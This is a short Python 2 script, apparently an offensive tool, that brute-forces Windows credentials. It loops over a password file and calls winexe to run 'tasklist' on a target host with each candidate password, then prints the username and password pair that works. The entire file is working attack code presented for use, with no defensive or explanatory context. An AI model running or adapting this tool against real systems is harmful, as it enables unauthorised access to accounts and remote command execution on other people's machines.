#!/usr/bin/python 

import subprocess as sb
import sys

success=False

def connect_to_target(target,user,password):
        
        global success
        null = open("/dev/null","w")
        cmd = ['winexe',"-U"+user+"%"+password, r"//"+target, "tasklist" ]
        ret = sb.call(cmd, stdout=null,stderr=sb.STDOUT)
        if ret == 0:
                print "\033[1;32m[+] Connected to host "+target+" with credentials : "+user+":"+password
                success=True
        null.close()

if __name__ == "__main__":
        
        if len(sys.argv) != 4:
                print "[*] Usage : "+sys.argv[0]+" <target> <username> <passwordfile>"
                sys.exit(1)


        password_file=open(sys.argv[3])

        for line in password_file.readlines():
            password = line.strip()
            connect_to_target(sys.argv[1],sys.argv[2],password)
            if(success):
                    break
       
        if(not(success)):
            print "\033[1;31m[-] Could not brute-force login.\033[m"
	
        password_file.close()
	
